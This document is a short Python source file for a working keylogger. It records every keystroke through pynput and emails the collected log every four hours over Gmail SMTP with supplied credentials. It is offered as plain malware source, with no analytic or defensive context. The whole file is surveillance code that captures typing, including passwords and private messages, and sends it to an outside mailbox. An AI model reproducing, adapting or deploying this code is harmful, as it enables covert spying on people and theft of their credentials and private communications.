import smtplib
import pynput.keyboard
import threading

log = "" # create a variable to store the log

class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def callback_function(self, key):
        """This function is called when a key is pressed"""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        """This function is called every 4 hours"""
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(14400, self.report) # create a timer
        timer.start() # start the timer

    def send_mail(self, email, password, message):
        """This function sends the email"""
        server = smtplib.SMTP("smtp.gmail.com", 587)  # create an SMTP object
        server.starttls()  # start TLS
        server.login(email, password)  # login to the email
        server.sendmail(email, email, message)  # send the email
        server.quit()  # quit the server

    def start(self):
        """This function starts the keylogger"""
        keyword_listener = pynput.keyboard.Listener(on_press=self.callback_function)
        with keyword_listener: # create a thread
            self.report() # start the report function
            keyword_listener.join() # start the listener

